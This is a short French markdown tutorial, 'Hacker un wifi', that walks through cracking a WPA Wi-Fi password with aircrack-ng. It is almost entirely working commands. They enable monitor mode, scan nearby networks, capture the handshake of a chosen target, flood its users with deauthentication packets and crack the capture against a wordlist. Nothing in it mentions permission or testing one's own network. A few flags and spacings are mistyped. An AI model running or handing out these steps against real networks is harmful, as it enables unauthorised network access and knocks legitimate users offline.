# Hacker un wifi

## pré requis :
Aircrack-ng :
    
- installation : `sudo apt-get install -y aircrack-ng`

## tuto :

1. choisir l'interface : 
   - `ifconfig`
  
2. kill tout les processus lancé et Lancer le mode moniteurr sur l'interface concernée :
   - `sudo airmon-ng check kill`
   - `sudo airmon-ng start [INTERFACE]`

3. Utiliser airodump pour scanner tous les réseaux aux alentours :
    -  `sudo airodump-ng [INTERFACEmon]`

4. Scanner le réseaux et mettre le handshake trouvé dans un fichier :
    
   - `sudo airodump-ng --bssid [BSSID] -c [CHANNEL] [INTERFACE] --write handshake/handshake.cap`\
    **help :** --bssid = bssid du wifi cible | -c = channel du wifi [1-13] | 
    --write = stocke les information capturé dans la location donnée

5. En laissant tourner le scan du handshake, envoyez des paquets de désauthentification aux autulisateurs du wifi :
   - `sudo aireplay-ng -0 100 -a [BSSID] [INTERFACE]`\
   **help :** -o = nombre de pacquet de désauthentification a envoyer | -a = Bssid du wifi cible

6. Cracker le handshake :
   - `sudo aircrack-ng handshake/handshake.cap-01.cap-w [WORDLIST] `\
   **help :** -w = location de la wordlist

7. enlever le mode moniteur et rallumer le service : 
   - `sudo airmon-ng stop [INTERFACE]`
   - ` sudo service network-manager restart`
  
